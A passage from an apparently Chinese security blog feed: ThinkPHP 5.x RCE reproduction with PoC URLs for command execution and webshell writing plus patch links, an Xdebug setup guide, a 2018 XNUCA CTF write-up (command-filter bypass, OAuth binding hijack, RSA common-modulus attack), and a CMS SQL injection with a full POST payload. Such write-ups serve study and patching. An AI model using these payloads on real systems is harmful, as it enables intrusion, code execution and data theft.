src="/images/Bj5ShWd.png"><br>由于<code>var_pathinfo</code>的默认配置为<code>s</code>，我们可利用<code>$_GET[&#39;s&#39;]</code>来传递路由信息，也可利用<code>pathinfo</code>来传递，但测试时<code>windows</code>环境下会将<code>$_SERVER[&#39;pathinfo&#39;]</code>中的<code>\</code>替换为<code>/</code>。<br>结合前面分析可得初步利用代码如下：<code>index.php?s=index/\namespace\class/method </code>，这将会实例化<code>\namespace\class</code>类并执行<code>method</code>方法。<br>然而利用过程中会存在一些限制，部分类在实例化时由于缺少参数而报错。<br>经过一番寻找，在<code>\think\Request</code>类中找到可以利用的方法<code>input</code>。以下为执行<code>phpinfo</code><br><img src="/images/qoEVsRB.png"></p><h1 id="环境搭建"><a href="#环境搭建" class="headerlink" title="环境搭建"></a>环境搭建</h1><h2 id="TP5-0"><a href="#TP5-0" class="headerlink" title="TP5.0.*"></a>TP5.0.*</h2><p>直接从官网下载完整包解压到www（网站根目录）目录即可，URL指向public目录（如：<a href="http://localhost/TP5.0.22/public/">http://localhost/TP5.0.22/public/</a> ）</p><h2 id="TP5-1"><a href="#TP5-1" class="headerlink" title="TP5.1.*"></a>TP5.1.*</h2><p>官方不再提供完整版下载，笔者从<code>composer</code>下载最新版后与官方GitHub进行了对比，发现以下几个仓库<br><a href="https://github.com/top-think/framework">Framework</a><br><a href="https://github.com/top-think/think">think</a><br><a href="https://github.com/top-think/think-installer">think-installer</a><br>发现<code>framework</code>仓库就是完整版中的<code>thinkphp</code>目录<br><img src="/images/WU29xTj.png"><br><img src="/images/Nb1OTBQ.png"><br><code>think</code>仓库是<code>thinkphp</code>的主架构<br><code>think-installer</code>对应路径为<code>path\to\thinkphp\vendor\topthink\think-installer</code><br>那么整合下就好了<br>最终目录架构<br><img src="/images/yneSfIP.png"><br>访问下<br><img src="/images/cRuL2lH.png"></p><h1 id="POC"><a href="#POC" class="headerlink" title="POC"></a>POC</h1><h2 id="TP版本5-0-21："><a href="#TP版本5-0-21：" class="headerlink" title="TP版本5.0.21："></a>TP版本5.0.21：</h2><p><code>http://localhost/thinkphp_5.0.21/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</code><br><img src="/images/XUjPpxb.png"></p><p><code>http://localhost/thinkphp_5.0.21/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</code><br><img src="/images/KeDQzUm.png"></p><h2 id="TP版本5-0-22："><a href="#TP版本5-0-22：" class="headerlink" title="TP版本5.0.22："></a>TP版本5.0.22：</h2><p><code>http://url/to/thinkphp_5.0.22/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=id</code><br><img src="/images/7SrIz6U.png"></p><p><code>http://url/to/thinkphp_5.0.22/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</code><br><img src="/images/YMN2l7m.png"></p><h2 id="TP5-1-1"><a href="#TP5-1-1" class="headerlink" title="TP5.1.*"></a>TP5.1.*</h2><p><strong>thinkphp5.1.29为例</strong></p><p><strong>1、代码执行:</strong><br><code>http://url/to/thinkphp5.1.29/?s=index/\think\Request/input&amp;filter=phpinfo&amp;data=1</code><br><img src="/images/vdPHFZd.png"></p><p><strong>2、命令执行:</strong><br><code>http://url/to/thinkphp5.1.29/?s=index/\think\Request/input&amp;filter=system&amp;data=操作系统命令</code><br><img src="/images/F5VWU1A.png"></p><p><strong>3、文件写入（写shell）：</strong><br><code>http://url/to/thinkphp5.1.29/?s=index/\think\template\driver\file/write&amp;cacheFile=shell.php&amp;content=%3C?php%20phpinfo();?%3E</code><br><img src="/images/63d5t6k.png"></p><p><strong>4、未知:</strong><br><code>http://url/to/thinkphp5.1.29/?s=index/\think\view\driver\Php/display&amp;content=%3C?php%20phpinfo();?%3E</code></p><p><strong>5、代码执行:</strong><br><code>http://url/to/thinkphp5.1.29/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</code><br><img src="/images/fmXDhBm.png"></p><p><strong>6、命令执行:</strong><br><code>http://url/to/thinkphp5.1.29/?s=index/\think\app/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=操作系统命令</code><br><img src="/images/71eijSN.png"></p><p><strong>7、代码执行:</strong><br><code>http://url/to/thinkphp5.1.29/?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=phpinfo&amp;vars[1][]=1</code><br><img src="/images/AOPpttb.png"></p><p><strong>8、命令执行:</strong><br><code>http://url/to/thinkphp5.1.29/?s=index/\think\Container/invokefunction&amp;function=call_user_func_array&amp;vars[0]=system&amp;vars[1][]=操作系统命令</code><br><img src="/images/UM5djyf.png"></p><h1 id="修复方案"><a href="#修复方案" class="headerlink" title="修复方案"></a>修复方案</h1><h2 id="官方现已推出补丁-建议开发者进行修复"><a href="#官方现已推出补丁-建议开发者进行修复" class="headerlink" title="官方现已推出补丁 建议开发者进行修复"></a>官方现已推出补丁 建议开发者进行修复</h2><p>Thinkphp v5.0.x补丁地址: <a href="https://github.com/top-think/framework/commit/b797d72352e6b4eb0e11b6bc2a2ef25907b7756f">https://github.com/top-think/framework/commit/b797d72352e6b4eb0e11b6bc2a2ef25907b7756f</a></p><p>Thinkphp v5.1.x补丁地址: <a href="https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815">https://github.com/top-think/framework/commit/802f284bec821a608e7543d91126abc5901b2815</a></p>]]></content>
      
      
      <categories>
          
          <category> VulRepro </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> VulRepro </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>Sublime Text 3搭建PHP Debug环境</title>
      <link href="/p/a0b.html"/>
      <url>/p/a0b.html</url>
      
        <content type="html"><![CDATA[<p>记录下搭建PHP的Debug环境</p><span id="more"></span><p><strong>笔者已转VSCode，本文可能已失效</strong></p><h1 id="本机环境"><a href="#本机环境" class="headerlink" title="本机环境"></a>本机环境</h1><p>环境如下</p><blockquote><p>PHP:7.1</p><p>OS:Windows 10</p><p>IDE:Sublime Text 3</p></blockquote><h1 id="步骤"><a href="#步骤" class="headerlink" title="步骤"></a>步骤</h1><h2 id="下载Xdebug"><a href="#下载Xdebug" class="headerlink" title="下载Xdebug"></a>下载Xdebug</h2><p>到<a href="https://xdebug.org/download.php">https://xdebug.org/download.php</a> 下载最新版的XDebug文件。<br>下载之后改名为<code>php_xdebug.dll</code>（不改名也不影响）放到PHP7根目录下的ext子目录下。<br>如果不知道该下载哪个，可以到<a href="https://xdebug.org/wizard.php">https://xdebug.org/wizard.php</a> 粘贴phpinfo的内容自动分析</p><h2 id="配置PHP"><a href="#配置PHP" class="headerlink" title="配置PHP"></a>配置PHP</h2><p>修改PHP7根目录下的php.ini文件，在最后添加如下代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">[xdebug]</span><br><span class="line">zend_extension = C:\AppServ\php7\ext\php_xdebug-2.6.1-7.1-vc14-x86_64.dll</span><br><span class="line">xdebug.remote_enable=true</span><br><span class="line">xdebug.collect_params=1</span><br><span class="line">xdebug.collect_return=1</span><br><span class="line">xdebug.collect_vars=1</span><br><span class="line">xdebug.collect_assignments=1</span><br><span class="line">xdebug.collect_includes=1</span><br><span class="line">xdebug.trace_format=1</span><br><span class="line">xdebug.auto_trace=1</span><br><span class="line">;xdebug.trace_options=1</span><br><span class="line">xdebug.profiler_enable = on</span><br><span class="line">xdebug.profiler_enable_trigger = on</span><br><span class="line">xdebug.profiler_output_name = cachegrind.out.%t.%p</span><br><span class="line">xdebug.profiler_output_dir = &quot;C:/AppServ/www/debugger/&quot;</span><br><span class="line">xdebug.trace_output_name=trace.%H%R%t</span><br><span class="line">;xdebug.show_local_vars=1</span><br><span class="line">xdebug.remote_handler = dbgp   </span><br><span class="line">xdebug.remote_host= localhost</span><br><span class="line">xdebug.remote_port = 9999</span><br><span class="line">xdebug.remote_log=&quot;C:/AppServ/www/debugger/xdebug.log&quot;</span><br></pre></td></tr></table></figure><p>需要指明的是<code>xdebug</code>的端口号改为<code>9999</code>，也没有指定<code>idekey</code>。<br>最后需要检查<code>xdebug</code>安装是否成功，如果在<code>phpinfo()</code>页面中显示出如下<code>XDebug</code>内容，则表示配置<code>XDebug</code>安装成功。<br><img src="/images/ihuomSW.png"></p><h2 id="Sublime-Text-3安装Package-Control插件"><a href="#Sublime-Text-3安装Package-Control插件" class="headerlink" title="Sublime Text 3安装Package Control插件"></a>Sublime Text 3安装Package Control插件</h2><p>在Sublime Text 3中使用Ctrl+~调出控制台，在控制台中输入</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> urllib.request,os,hashlib; </span><br><span class="line">h = <span class="string">&#x27;2915d1851351e5ee549c20394736b442&#x27;</span> + <span class="string">&#x27;8bc59f460fa1548d1514676163dafc88&#x27;</span>; </span><br><span class="line">pf = <span class="string">&#x27;Package Control.sublime-package&#x27;</span>; </span><br><span class="line">ipp = sublime.installed_packages_path(); </span><br><span class="line">urllib.request.install_opener( urllib.request.build_opener( urllib.request.ProxyHandler()) ); </span><br><span class="line">by = urllib.request.urlopen( <span class="string">&#x27;http://packagecontrol.io/&#x27;</span> + pf.replace(<span class="string">&#x27; &#x27;</span>, <span class="string">&#x27;%20&#x27;</span>)).read(); </span><br><span class="line">dh = hashlib.sha256(by).hexdigest(); </span><br><span class="line"><span class="built_in">print</span>(<span class="string">&#x27;Error validating download (got %s instead of %s), please try manual install&#x27;</span> % (dh, h)) <span class="keyword">if</span> dh != h <span class="keyword">else</span> <span class="built_in">open</span>(os.path.join( ipp, pf), <span class="string">&#x27;wb&#x27;</span> ).write(by)</span><br></pre></td></tr></table></figure><p>之后，按回车执行，下载安装<code>Package Control.sublime-package</code>（可能需翻墙），重启之后Sublime Text 3的Preferences菜单下会多出Package Control二级菜单。</p><h2 id="Sublime-Text-3安装XDebug插件"><a href="#Sublime-Text-3安装XDebug插件" class="headerlink" title="Sublime Text 3安装XDebug插件"></a>Sublime Text 3安装XDebug插件</h2><p>按Ctrl+Shift+P组合键，然后输入install，并点击Package Control：Install Package ，调出Package Control窗口，然后输入xdebug，选择下方的XDebug Client，安装XDebug插件（可能需翻墙）。成功安装后，Preferences菜单下的Package Settings二级菜单中会多出Xdebug三级菜单。</p><h2 id="配置XDebug插件"><a href="#配置XDebug插件" class="headerlink" title="配置XDebug插件"></a>配置XDebug插件</h2><p>由于Sublime Text 3不允许修改默认设置，仅允许我们修改用户设置，因此需要生成一份XDebug的用户设置后再修改。<br>打开Preferences菜单下的Package Settings二级菜单下Xdebug三级菜单中的“Settings - Default”，复制该窗口的所有内容；</p><p>打开Preferences菜单下的Package Settings二级菜单下Xdebug三级菜单中的“Settings - User”，粘贴上一步复制的所有内容；<br>修改第30行”port”配置为</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&quot;port&quot;: 9999,</span><br></pre></td></tr></table></figure><p>改完之后保存用户设置，用户配置将会保存到Sublime Text 3安装目录下的<code>Data\Packages\User\Xdebug.sublime-settings</code>文件中。</p><h2 id="调试PHP"><a href="#调试PHP" class="headerlink" title="调试PHP"></a>调试PHP</h2><p>启动web服务，在网站根目录新建个文件为</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$a</span> = <span class="number">1</span>;</span><br><span class="line"><span class="variable">$b</span> = <span class="number">2</span>;</span><br><span class="line"><span class="title function_ invoke__">var_dump</span>(<span class="variable">$_GET</span>);</span><br><span class="line"><span class="keyword">echo</span> <span class="title function_ invoke__">phpinfo</span>();</span><br><span class="line"><span class="meta">?&gt;</span></span><br></pre></td></tr></table></figure><p>这样就可以调试了。</p><p>XDebug Client调试快捷键：</p><blockquote><p>Ctrl+F8: 填加&#x2F;删除断点；<br>Ctrl+Shift+F5: 运行到下一个断点；<br>Ctrl+Shift+F6: 单步；<br>Ctrl+Shift+F7: 步入；<br>Ctrl+Shift+F8: 步出 ；</p></blockquote><h2 id="其他"><a href="#其他" class="headerlink" title="其他"></a>其他</h2><h3 id="Sublime-PHP-Companion"><a href="#Sublime-PHP-Companion" class="headerlink" title="Sublime PHP Companion"></a>Sublime PHP Companion</h3><p>SublimeCTagsPHP的接班者，提供PHP编码期间的素材使用。</p><h3 id="AllAutocomplete"><a href="#AllAutocomplete" class="headerlink" title="AllAutocomplete"></a>AllAutocomplete</h3><p>Sublime 默认仅提供基于当前文件的自动补全，装上AllAutocomplete后，会提供基于所有文件的自动补全功能。</p><h3 id="sublime-phpcs"><a href="#sublime-phpcs" class="headerlink" title="sublime-phpcs"></a>sublime-phpcs</h3><h3 id="DocBlockr"><a href="#DocBlockr" class="headerlink" title="DocBlockr"></a>DocBlockr</h3><h3 id="Sublime-Text-Git"><a href="#Sublime-Text-Git" class="headerlink" title="Sublime Text Git"></a>Sublime Text Git</h3><h3 id="GitGutter"><a href="#GitGutter" class="headerlink" title="GitGutter"></a>GitGutter</h3><h3 id="Bracket-Highlighting"><a href="#Bracket-Highlighting" class="headerlink" title="Bracket Highlighting"></a>Bracket Highlighting</h3><h3 id="CodeIntel"><a href="#CodeIntel" class="headerlink" title="CodeIntel"></a>CodeIntel</h3><h3 id="SublimePrettyJson"><a href="#SublimePrettyJson" class="headerlink" title="SublimePrettyJson"></a>SublimePrettyJson</h3><h3 id="ConvertToUTF8"><a href="#ConvertToUTF8" class="headerlink" title="ConvertToUTF8"></a>ConvertToUTF8</h3><p>支持UTF-8编码的插件，装上之后，Sublime Text就支持UTF-8编码了。</p><h3 id="Emmet"><a href="#Emmet" class="headerlink" title="Emmet"></a>Emmet</h3><p>Web开发者必要的插件</p><h3 id="Sidebar-Enhancements"><a href="#Sidebar-Enhancements" class="headerlink" title="Sidebar Enhancements"></a>Sidebar Enhancements</h3><p>这个插件改进了侧边栏，增加了许多功能</p><h3 id="FAQ"><a href="#FAQ" class="headerlink" title="FAQ"></a>FAQ</h3><p>Q1:如何关闭XDebug Client的调试窗口？</p><p>A1:Ctrl+Shift+P，在调出的窗口输入xdebug，选择Xdebug: Stop Debugging(…)，之后Ctrl+Shift+P，在调出的窗口输入xdebug，选择Xdebug: Restore Layout。</p>]]></content>
      
      
      <categories>
          
          <category> PHP </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>2018年XNUCA Web部分WriteUp</title>
      <link href="/p/e1f7.html"/>
      <url>/p/e1f7.html</url>
      
        <content type="html"><![CDATA[<p>2018年XNUCA部分WriteUp</p><p>虐心+被侮辱智商</p><span id="more"></span><h1 id="WEB"><a href="#WEB" class="headerlink" title="WEB"></a>WEB</h1><h2 id="ezdotso"><a href="#ezdotso" class="headerlink" title="ezdotso"></a>ezdotso</h2><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="meta">&lt;?php</span></span><br><span class="line"><span class="variable">$param</span> = <span class="keyword">array</span>();</span><br><span class="line"><span class="title function_ invoke__">parse_str</span>(<span class="variable">$_SERVER</span>[<span class="string">&#x27;QUERY_STRING&#x27;</span>]);</span><br><span class="line"><span class="keyword">if</span> (<span class="keyword">isset</span>(<span class="variable">$action</span>))&#123;</span><br><span class="line">    <span class="keyword">switch</span>(<span class="variable">$action</span>)&#123;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;php_info&quot;</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">call_user_func_array</span>(<span class="string">&quot;php_info&quot;</span>,<span class="variable">$param</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">case</span> <span class="string">&quot;cmd&quot;</span>:</span><br><span class="line">        <span class="keyword">if</span>(<span class="keyword">isset</span>(<span class="variable">$cmd</span>))&#123;</span><br><span class="line">            <span class="keyword">if</span>(<span class="title function_ invoke__">is_string</span>(<span class="variable">$cmd</span>))&#123;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">strlen</span>(<span class="variable">$cmd</span>)&gt;<span class="number">9</span>)&#123;</span><br><span class="line">                    <span class="keyword">die</span>();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$pat1</span> = <span class="string">&quot;/[^0-9a-zA-Z \/\*]/&quot;</span>;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pat1</span>, <span class="variable">$cmd</span>)&gt;<span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="keyword">die</span>();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="variable">$pat2</span> = <span class="string">&quot;/^[a-zA-Z]+ [0-9a-zA-Z\/\*]+$/&quot;</span>;</span><br><span class="line">                <span class="keyword">if</span> (<span class="title function_ invoke__">preg_match</span>(<span class="variable">$pat2</span>, <span class="variable">$cmd</span>)==<span class="number">0</span>)&#123;</span><br><span class="line">                    <span class="keyword">die</span>();</span><br><span class="line">                &#125;</span><br><span class="line">                <span class="title function_ invoke__">system</span>(<span class="string">&quot;busybox &quot;</span> . <span class="variable">$cmd</span>);</span><br><span class="line">            &#125;</span><br><span class="line">        &#125; </span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">        <span class="keyword">default</span>:</span><br><span class="line">        <span class="keyword">echo</span> <span class="title function_ invoke__">call_user_func_array</span>(<span class="string">&quot;hello&quot;</span>,<span class="variable">$param</span>);</span><br><span class="line">        <span class="keyword">break</span>;</span><br><span class="line">    &#125;</span><br><span class="line">&#125;<span class="keyword">else</span>&#123;</span><br><span class="line">    <span class="title function_ invoke__">show_source</span>(<span class="keyword">__FILE__</span>);</span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p> action 变量为 cmd 时，将会对 cmd 变量进行两次正则过滤，过滤之后将会使用 <code>busybox</code> 执行linux shell命令。要使程序正常运行下去，则cmd变量必须为字符串，且长度不能超过9。为了过第一个正则判断，则该字符串必须由两部分组成，且中间使用空格隔开，第一部分为大小写字母以及数字开头，第二部分含有 * 或者 &#x2F; 两个符号。为了过第二个正则判断，则该第一部分为一个或一个以上大小写字母，第二部分以大小写字母或者 * 或者 &#x2F; 这两个符号结尾。使用PHP模拟判断过程，可以发现诸如 <code>ls /</code> ； <code>ls *</code> 等命令+一个参数的 shell 命令均可以通过条件判断。执行 <code>ls /</code> 时发现在 &#x2F; 根目录下，有一个 flag 文件，使用 <code>cat /flag</code> 即可读取文件内容。</p><p>Payload:<code>?action=cmd&amp;cmd=cat /flag</code></p><p>Flag:<code>flag&#123;433b246d-71de-4dfe-b6dc-624f991e2d0f&#125;</code></p><h2 id="Blog"><a href="#Blog" class="headerlink" title="Blog"></a>Blog</h2><p>题目是OAuth2.0 认证缺陷攻击</p><blockquote><p> you can login in the blog services by your username or auth by auth2.0, try to hack it.<br><a href="http://106.75.66.211:8000/">http://106.75.66.211:8000/</a></p></blockquote><p>提交的链接只允许 <a href="http://106.75.66.211:8000/">http://106.75.66.211:8000</a> 开头, 并且长度有限制<br>已登录用户可以通过下面任意跳转<br><a href="http://106.75.66.211:8000/main/login?next=//baidu.com">http://106.75.66.211:8000/main/login?next=//baidu.com</a></p><p>未绑定oauth的用户可以点击绑定跳转到绑定界面<br>但是返回链接没有对用户做确认. 只要点击绑定返回的连接 就会被绑定成</p><p>攻击链:</p><ol><li><p>建立一个 oauth 账号</p></li><li><p>建立一个 blog 账号</p></li><li><p>点击绑定新账号, 使用 burp 拦截回调链接</p></li><li><p>在自己的服务器写下如下代码</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">&lt;?php</span><br><span class="line">header(&#x27;location: http://106.75.66.211:8000/main/oauth/?state=OnmJVKIR0V&amp;code=*********&#x27;)</span><br></pre></td></tr></table></figure></li><li><p>提交 <a href="http://106.75.66.211:8000/main/login?next=//xxxx">http://106.75.66.211:8000/main/login?next=//xxxx</a> 给管理员</p></li><li><p>使用oauth 重新登录 blog 即成为管理员</p></li></ol><p>Flag:<code>flag&#123;30b1651e8445120f66d93c8c5edff507&#125;</code></p><h1 id="Crypto"><a href="#Crypto" class="headerlink" title="Crypto"></a>Crypto</h1><h2 id="Warm-Up"><a href="#Warm-Up" class="headerlink" title="Warm Up"></a>Warm Up</h2><p>共模攻击</p><p>看流量包 Alice, Dave 的N相同</p><figure class="highlight python"><table><tr><td class="code"><pre><span class="line"><span class="keyword">import</span> gmpy2</span><br><span class="line">n = <span class="number">25118186052801903419891574512806521370646053661385577314262283167479853375867074736882903917202574957661470179148882538361560784362740207649620536746860883395110443930778132343642295247749797041449601967434690280754279589691669366595486824752597992245067619256368446164574344449914827664991591873150416287647528776014468498025993455819767004213726389160036077170973994848480739499052481386539293425983093644799960322581437734560001018025823047877932105216362961838959964371333287407071080250979421489210165485908404019927393053325809061787560294489911475978342741920115134298253806238766543518220987363050115050813263</span></span><br><span class="line">e1 = <span class="number">7669</span></span><br><span class="line"></span><br><span class="line">e2 = <span class="number">6947</span></span><br><span class="line"></span><br><span class="line">message1 = <span class="number">22917655888781915689291442748409371798632133107968171254672911561608350738343707972881819762532175014157796940212073777351362314385074785400758102594348355578275080626269137543136225022579321107199602856290254696227966436244618441350564667872879196269074433751811632437228139470723203848006803856868237706401868436321225656126491701750534688966280578771996021459620472731406728379628286405214996461164892486734170662556518782043881759918394674517409304629842710180023814702447187081112856416034885511215626693534876901484105593275741829434329109239483368867518384522955176807332437540578688867077569728548513876841471</span></span><br><span class="line"></span><br><span class="line">message2 = <span class="number">20494665879116666159961016125949070097530413770391893858215547229071116025581822729798313796823204861624912909030975450742122802775879194445232064367771036011021366123393917354134849911675307877324103834871288513274457941036453477034798647182106422619504345055259543675752998330786906376830335403339610903547255965127196315113331300512641046933227008101401416026809256813221480604662012101542846479052832128788279031727880750642499329041780372405567816904384164559191879422615238580181357183882111249939492668328771614509476229785062819586796660370798030562805224704497570446844131650030075004901216141893420140140568</span></span><br><span class="line"><span class="comment"># s &amp; t</span></span><br><span class="line">gcd, s, t = gmpy2.gcdext(e1, e2)</span><br><span class="line"><span class="keyword">if</span> s &lt; <span class="number">0</span>:</span><br><span class="line">    s = -s</span><br><span class="line">    message1 = gmpy2.invert(message1, n)</span><br><span class="line"><span class="keyword">if</span> t &lt; <span class="number">0</span>:</span><br><span class="line">    t = -t</span><br><span class="line">    message2 = gmpy2.invert(message2, n)</span><br><span class="line">plain = gmpy2.powmod(message1, s, n) * gmpy2.powmod(message2, t, n) % n</span><br><span class="line"><span class="built_in">print</span> <span class="built_in">hex</span>(plain)</span><br><span class="line"></span><br><span class="line"><span class="number">0x464c41477b673030645f4c75636b5f265f486176335f46756e7d</span></span><br></pre></td></tr></table></figure><p>Flag:<code>flag&#123;g00d_Luck_&amp;_Hav3_Fun&#125;</code></p><p>部分题目下载<a href="https://github.com/NS-Sp4ce/2018-XNUCA">Github下载</a></p>]]></content>
      
      
      <categories>
          
          <category> CTF </category>
          
      </categories>
      
      
        <tags>
            
            <tag> CTF </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>建站之星v2.7SQL注入</title>
      <link href="/p/511.html"/>
      <url>/p/511.html</url>
      
        <content type="html"><![CDATA[<p>CTF比赛中出了这个CMS的题 下载回源码看了下</p><span id="more"></span><p>问题出在<code>module/mod_email.php</code>第147行左右</p><figure class="highlight php"><table><tr><td class="code"><pre><span class="line"><span class="keyword">public</span> <span class="function"><span class="keyword">function</span> <span class="title">do_mail</span>(<span class="params"></span>)</span>&#123;</span><br><span class="line">   <span class="keyword">global</span> <span class="variable">$db</span>;</span><br><span class="line">    <span class="variable">$title</span> = <span class="title class_">ParamHolder</span>::<span class="title function_ invoke__">get</span>(<span class="string">&quot;title&quot;</span>);</span><br><span class="line">    <span class="variable">$msg</span> = <span class="title class_">ParamHolder</span>::<span class="title function_ invoke__">get</span>(<span class="string">&quot;email_s&quot;</span>);</span><br><span class="line">    <span class="variable">$msg</span> .= <span class="title class_">ParamHolder</span>::<span class="title function_ invoke__">get</span>(<span class="string">&quot;email_m&quot;</span>);</span><br><span class="line">    <span class="variable">$roles</span> = <span class="title class_">ParamHolder</span>::<span class="title function_ invoke__">get</span>(<span class="string">&quot;role&quot;</span>);</span><br><span class="line">    <span class="variable">$type</span> = <span class="title class_">ParamHolder</span>::<span class="title function_ invoke__">get</span>(<span class="string">&quot;type&quot;</span>);</span><br><span class="line">    <span class="variable">$user_email</span> = <span class="title class_">ParamHolder</span>::<span class="title function_ invoke__">get</span>(<span class="string">&#x27;users&#x27;</span>); </span><br><span class="line">    <span class="variable">$send_id</span> = <span class="title class_">SessionHolder</span>::<span class="title function_ invoke__">get</span>(<span class="string">&quot;user/id&quot;</span>);</span><br><span class="line">    <span class="variable">$time</span> = <span class="title function_ invoke__">time</span>();</span><br><span class="line">    <span class="variable">$ok</span> = <span class="number">0</span>;</span><br><span class="line">    .............省略</span><br><span class="line">    <span class="keyword">else</span>&#123;<span class="comment">//邮件群发</span></span><br><span class="line"><span class="keyword">foreach</span> (<span class="variable">$roles</span> <span class="keyword">as</span> <span class="variable">$k</span>=&gt;<span class="variable">$row</span>)&#123;</span><br><span class="line"><span class="variable">$sql</span> = <span class="string">&quot;select id,login,email from &quot;</span>.<span class="title class_">Config</span>::<span class="variable">$tbl_prefix</span>.<span class="string">&quot;users where s_role=&#x27;&#123;&quot;</span>.<span class="variable">$row</span>.<span class="string">&quot;&#125;&#x27;&quot;</span>;</span><br><span class="line">    <span class="variable">$res</span> = <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">    <span class="variable">$emails</span> = <span class="variable">$res</span>-&gt;<span class="title function_ invoke__">fetchRows</span>();</span><br><span class="line"><span class="keyword">if</span> (!<span class="keyword">empty</span>(<span class="variable">$emails</span>)) &#123;</span><br><span class="line">    <span class="keyword">foreach</span> (<span class="variable">$emails</span> <span class="keyword">as</span> <span class="variable">$eml</span>)&#123;</span><br><span class="line">        <span class="keyword">if</span>(<span class="variable language_">$this</span>-&gt;<span class="title function_ invoke__">send_mail</span>(<span class="variable">$title</span>,<span class="variable">$msg</span>,<span class="variable">$eml</span>[<span class="string">&#x27;email&#x27;</span>]))&#123;</span><br><span class="line">        <span class="variable">$ok</span>++;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;insert into &quot;</span>.<span class="title class_">Config</span>::<span class="variable">$tbl_prefix</span>.<span class="string">&quot;emails(`title`,`content`,user_id,user_name,is_mail,send_id,is_read,is_ok,create_time) values(&#x27;<span class="subst">&#123;$title&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$msg&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$eml[&#x27;id&#x27;]&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$eml[&#x27;login&#x27;]&#125;</span>&#x27;,1,<span class="subst">&#123;$send_id&#125;</span>,0,1,&#x27;<span class="subst">&#123;$time&#125;</span>&#x27;)&quot;</span>;</span><br><span class="line">    <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">        &#125;<span class="keyword">else</span>&#123;</span><br><span class="line">        <span class="variable">$sql</span> = <span class="string">&quot;insert into &quot;</span>.<span class="title class_">Config</span>::<span class="variable">$tbl_prefix</span>.<span class="string">&quot;emails(`title`,`content`,user_id,user_name,is_mail,send_id,is_read,is_ok,create_time) values(&#x27;<span class="subst">&#123;$title&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$msg&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$eml[&#x27;id&#x27;]&#125;</span>&#x27;,&#x27;<span class="subst">&#123;$eml[&#x27;login&#x27;]&#125;</span>&#x27;,1,<span class="subst">&#123;$send_id&#125;</span>,0,0,&#x27;<span class="subst">&#123;$time&#125;</span>&#x27;)&quot;</span>;</span><br><span class="line">    <span class="variable">$db</span>-&gt;<span class="title function_ invoke__">query</span>(<span class="variable">$sql</span>);</span><br><span class="line">        <span class="variable">$s_err</span>[] = <span class="variable">$eml</span>[<span class="string">&#x27;login&#x27;</span>];</span><br><span class="line">        &#125;</span><br><span class="line">    &#125;</span><br><span class="line">    &#125;<span class="keyword">else</span>&#123;</span><br></pre></td></tr></table></figure><p>SQL语句<code>$sql = &quot;select id,login,email from &quot;.Config::$tbl_prefix.&quot;users where s_role=&#39;&#123;&quot;.$row.&quot;&#125;&#39;&quot;;</code></p><p>其中SQL语句中的<code>$row</code>为遍历<code>$roles</code>后的内容，没有做过滤导致SQL注入</p><p>Payload:</p><figure class="highlight plaintext"><table><tr><td class="code"><pre><span class="line">POST /index.php?_a=do_mail&amp;_m=mod_email HTTP/1.1</span><br><span class="line">Content-Type: application/x-www-form-urlencoded; charset=utf-8</span><br><span class="line">Host: localhost</span><br><span class="line">Connection: close</span><br><span class="line">User-Agent: Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/69.0.3497.81 Safari/537.36</span><br><span class="line">Content-Length: 112</span><br><span class="line">title=aa&amp;email_s=a&amp;email_m=a&amp;type=a&amp;users=aaaa&#x27;|aaa&amp;role[]=abdc&#125;&#x27;+union+select+</span><br><span class="line">1,user(),3#</span><br></pre></td></tr></table></figure>]]></content>
      
      
      <categories>
          
          <category> CodeReview </category>
          
      </categories>
      
      
        <tags>
            
            <tag> PHP </tag>
            
            <tag> CodeReview </tag>
            
            <tag> SQLi </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>FBCTF汉化 基于Ubuntu 16.04</title>
      <link href="/p/fad0.html"/>
